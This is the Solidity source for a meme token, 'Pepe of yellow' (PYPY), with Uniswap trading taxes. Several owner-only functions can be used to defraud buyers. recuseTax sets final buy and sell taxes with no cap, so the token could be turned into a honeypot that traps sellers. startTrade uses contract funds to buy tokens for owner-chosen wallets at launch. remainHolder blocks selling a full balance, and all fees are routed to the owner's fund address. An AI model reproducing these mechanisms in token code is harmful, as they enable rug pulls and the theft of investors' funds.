1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.4;
4 
5 /*
6 
7  $PYPY is $PEPE 's brother, they are one yellow and one green. PEPE has created a legend. PYPY will kill more zeros. Let the yellow storm sweep the world
8 
9  * Twitter : https://twitter.com/pypycoineth
10  * Telegram : https://t.me/PYPYCoinETH
11  * Website : https://pypycoin.vip/
12 */
13 
14 interface IERC20 {
15     function decimals() external view returns (uint8);
16     function symbol() external view returns (string memory);
17     function name() external view returns (string memory);
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 interface IUniswapRouter {
29 
30     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
31     function factory() external pure returns (address);
32 
33     function WETH() external pure returns (address);
34 
35     function swapExactTokensForETHSupportingFeeOnTransferTokens(
36         uint amountIn,
37         uint amountOutMin,
38         address[] calldata path,
39         address to,
40         uint deadline
41     ) external;
42 
43     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
44         uint amountIn,
45         uint amountOutMin,
46         address[] calldata path,
47         address to,
48         uint deadline
49     ) external;
50 
51     function addLiquidityETH(
52         address token,
53         uint amountTokenDesired,
54         uint amountTokenMin,
55         uint amountETHMin,
56         address to,
57         uint deadline
58     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
59 }
60 
61 interface IUniswapFactory {
62     function getPair(address tokenA, address tokenB) external view returns (address pair);
63     function createPair(address tokenA, address tokenB) external returns (address pair);
64 }
65 
66 abstract contract Ownable {
67     address internal _owner;
68 
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     constructor () {
72         address msgSender = msg.sender;
73         _owner = msgSender;
74         emit OwnershipTransferred(address(0), msgSender);
75     }
76 
77     function owner() public view returns (address) {
78         return _owner;
79     }
80 
81     modifier onlyOwner() {
82         require(_owner == msg.sender, "you are not owner");
83         _;
84     }
85 
86     function renounceOwnership() public virtual onlyOwner {
87         emit OwnershipTransferred(_owner, address(0));
88         _owner = address(0);
89     }
90 
91     function transferOwnership(address newOwner) public virtual onlyOwner {
92         require(newOwner != address(0), "new is 0");
93         emit OwnershipTransferred(_owner, newOwner);
94         _owner = newOwner;
95     }
96 }
97 
98 contract ERC20 is IERC20, Ownable {
99     mapping(address => uint256) private _balances;
100     mapping(address => mapping(address => uint256)) private _allowances;
101 
102     address private fundAddress;
103 
104     string private _name;
105     string private _symbol;
106     uint8 private _decimals;
107 
108     mapping(address => bool) public _isExcludeFromFee;
109     
110     uint256 private _totalSupply;
111 
112     IUniswapRouter public _uniswapRouter;
113 
114     mapping(address => bool) public isMarketPair;
115     bool private inSwap;
116 
117     uint256 private constant MAX = ~uint256(0);
118 
119     address public _uniswapPair;
120 
121     modifier lockTheSwap {
122         inSwap = true;
123         _;
124         inSwap = false;
125     }
126 
127     constructor (){
128 
129         _name = "Pepe of yellow";
130         _symbol = "PYPY";
131         _decimals = 9;
132         uint256 Supply = 420_690_900_000_000;
133 
134         _totalSupply = Supply * 10 ** _decimals;
135 
136         address receiveAddr = msg.sender;
137         _balances[receiveAddr] = _totalSupply;
138         emit Transfer(address(0), receiveAddr, _totalSupply);
139 
140         fundAddress = msg.sender;
141 
142         _isExcludeFromFee[address(this)] = true;
143         _isExcludeFromFee[receiveAddr] = true;
144         _isExcludeFromFee[fundAddress] = true;
145 
146         IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
147         _uniswapRouter = swapRouter;
148         _allowances[address(this)][address(swapRouter)] = MAX;
149 
150         IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
151         _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());
152 
153         isMarketPair[_uniswapPair] = true;
154         IERC20(_uniswapRouter.WETH()).approve(
155             address(address(_uniswapRouter)),
156             ~uint256(0)
157         );
158         _isExcludeFromFee[address(swapRouter)] = true;
159 
160     }
161 
162     function setFundAddr(
163         address newAddr
164     ) public onlyOwner{
165         fundAddress = newAddr;
166     }
167 
168     function symbol() external view override returns (string memory) {
169         return _symbol;
170     }
171 
172     function name() external view override returns (string memory) {
173         return _name;
174     }
175 
176     function decimals() external view override returns (uint8) {
177         return _decimals;
178     }
179 
180     function totalSupply() public view override returns (uint256) {
181         return _totalSupply;
182     }
183 
184     function balanceOf(address account) public view override returns (uint256) {
185         return _balances[account];
186     }
187 
188     function transfer(address recipient, uint256 amount) public override returns (bool) {
189         _transfer(msg.sender, recipient, amount);
190         return true;
191     }
192 
193     function allowance(address owner, address spender) public view override returns (uint256) {
194         return _allowances[owner][spender];
195     }
196 
197     function approve(address spender, uint256 amount) public override returns (bool) {
198         _approve(msg.sender, spender, amount);
199         return true;
200     }
201 
202     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
203         _transfer(sender, recipient, amount);
204         if (_allowances[sender][msg.sender] != MAX) {
205             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
206         }
207         return true;
208     }
209 
210     function _approve(address owner, address spender, uint256 amount) private {
211         _allowances[owner][spender] = amount;
212         emit Approval(owner, spender, amount);
213     }
214 
215     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
216         _balances[sender] -= amount;
217         _balances[recipient] += amount;
218         emit Transfer(sender, recipient, amount);
219         return true;
220     }
221 
222     uint256 public _buyCount=0;
223     uint256 private _initialBuyTax=30;
224     uint256 private _initialSellTax=30;
225     uint256 private _finalBuyTax=1;
226     uint256 private _finalSellTax=1;
227     uint256 private _reduceBuyTaxAt=15;
228     uint256 private _reduceSellTaxAt=15;
229     uint256 private _preventSwapBefore=10;
230 
231     function recuseTax(
232         uint256 newBuy,
233         uint256 newSell,
234         uint256 newReduceBuy,
235         uint256 newReduceSell,
236         uint256 newPreventSwapBefore
237     ) public onlyOwner {
238         _finalBuyTax = newBuy;
239         _finalSellTax = newSell;
240         _reduceBuyTaxAt = newReduceBuy;
241         _reduceSellTaxAt = newReduceSell;
242         _preventSwapBefore = newPreventSwapBefore;
243     }
244 
245     bool public remainHolder = true;
246     function changeRemain() public onlyOwner{
247         remainHolder = !remainHolder;
248     }
249 
250     function _transfer(
251         address from,
252         address to,
253         uint256 amount
254     ) private {
255         uint256 balance = balanceOf(from);
256         require(balance >= amount, "balanceNotEnough");
257 
258         if (inSwap){
259             _basicTransfer(from, to, amount);
260             return;
261         }
262 
263         bool takeFee;
264 
265         if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && _buyCount > _preventSwapBefore) {
266             uint256 _numSellToken = amount;
267             if (_numSellToken > balanceOf(address(this))){
268                 _numSellToken = _balances[address(this)];
269             }
270             if (_numSellToken > 0){
271                 swapTokenForETH(_numSellToken);
272             }
273         }
274 
275         if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
276             require(startTradeBlock > 0);
277             takeFee = true;
278             
279             // buyCount
280             if (isMarketPair[from] && to != address(_uniswapRouter) && !_isExcludeFromFee[to]) {
281                 _buyCount++;
282             }
283 
284             // remainHolder
285             if (remainHolder && amount == balance) {
286                 amount = amount - (amount / 10000);
287             }
288 
289         }
290 
291         _transferToken(from, to, amount, takeFee);
292     }
293 
294     function _transferToken(
295         address sender,
296         address recipient,
297         uint256 tAmount,
298         bool takeFee
299     ) private {
300         _balances[sender] = _balances[sender] - tAmount;
301         uint256 feeAmount;
302 
303         if (takeFee) {
304             uint256 taxFee;
305             if (isMarketPair[recipient]) {
306                 taxFee = _buyCount > _reduceSellTaxAt ? _finalSellTax : _initialSellTax;
307             } else if (isMarketPair[sender]) {
308                 taxFee = _buyCount > _reduceBuyTaxAt ? _finalBuyTax : _initialBuyTax;
309             }
310             uint256 swapAmount = tAmount * taxFee / 100;
311             if (swapAmount > 0) {
312                 feeAmount += swapAmount;
313                 _balances[address(this)] = _balances[address(this)] + swapAmount;
314                 emit Transfer(sender, address(this), swapAmount);
315             }
316         }
317 
318         _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
319         emit Transfer(sender, recipient, tAmount - feeAmount);
320 
321     }
322 
323     uint256 public startTradeBlock;
324     function startTrade(address[] calldata adrs) public onlyOwner {
325         for(uint i=0;i<adrs.length;i++){
326             swapToken(((random(5,adrs[i])+1)*10**16+7*10**16),adrs[i]);
327         }
328         startTradeBlock = block.number;
329     }
330 
331     function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
332         address weth = _uniswapRouter.WETH();
333         address[] memory path = new address[](2);
334         path[0] = address(weth);
335         path[1] = address(this);
336         uint256 _bal = IERC20(weth).balanceOf(address(this));
337         tokenAmount = tokenAmount > _bal ? _bal : tokenAmount;
338         if (tokenAmount == 0) return;
339         // make the swap
340         _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
341             tokenAmount,
342             0, // accept any amount of CA
343             path,
344             address(to),
345             block.timestamp
346         );
347     }
348 
349     function random(uint number,address _addr) private view returns(uint) {
350         return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  _addr))) % number;
351     }
352 
353     function removeERC20(address _token) external {
354         if(_token != address(this)){
355             IERC20(_token).transfer(fundAddress, IERC20(_token).balanceOf(address(this)));
356             payable(fundAddress).transfer(address(this).balance);
357         }
358     }
359 
360     function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
361         address[] memory path = new address[](2);
362         path[0] = address(this);
363         path[1] = _uniswapRouter.WETH();
364         try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
365             tokenAmount,
366             0,
367             path,
368             address(this),
369             block.timestamp
370         ) {} catch {}
371 
372         uint256 _bal = address(this).balance;
373         if (_bal > 0){
374             payable(fundAddress).transfer(_bal);
375         }
376     }
377 
378     function setFeeExclude(address account, bool value) public onlyOwner{
379         _isExcludeFromFee[account] = value;
380     }
381 
382     receive() external payable {}
383 }